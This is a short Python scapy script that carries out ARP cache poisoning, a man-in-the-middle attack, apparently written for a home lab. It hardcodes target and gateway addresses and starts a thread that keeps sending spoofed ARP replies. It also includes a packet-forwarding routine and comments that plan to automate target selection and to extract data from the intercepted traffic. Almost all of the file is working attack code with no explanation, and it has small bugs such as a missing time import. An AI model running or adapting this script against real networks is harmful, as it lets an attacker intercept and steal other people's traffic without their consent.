from scapy.all import *
import threading


# Write Script for arping targets
# Test it on Local Machines
# Automate it for given IP
# Automatically Detect IPs
# Extract data from Traffic

target_ip = "192.168.56.103"
target_mac = "08:00:27:1c:c5:d7"
gateway_ip = "192.168.56.102"
gateway_mac = "08:00:27:99:9c:9b"


temp = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)



poisoning = True




def process_packet(pkt):
	if pkt.src == target_mac:
		pkt.dst = gateway_mac
		sendp(pkt)
	if pkt.src == gateway_mac:
		pkt.dst = target_mac
		sendp(pkt)




def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
	global poisoning

	print "[*] Beginning the ARP poison. [CTRL-C to stop]"

	while poisoning:
		try:
			send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac))
			send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac))
			time.sleep(2)
		except KeyboardInterrupt as e:
			print "[*] ARP poison attack finished."
			return
			pass
		finally:
			print "[*] ARP poison attack finished."
	return


def get_mac(ip_address, iface="eth1"):

	responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10,iface=iface)

	# return the MAC address from a response
	for s,r in responses:
		return r[Ether].src

	return None



# start poison thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,target_ip,target_mac))
poison_thread.start()
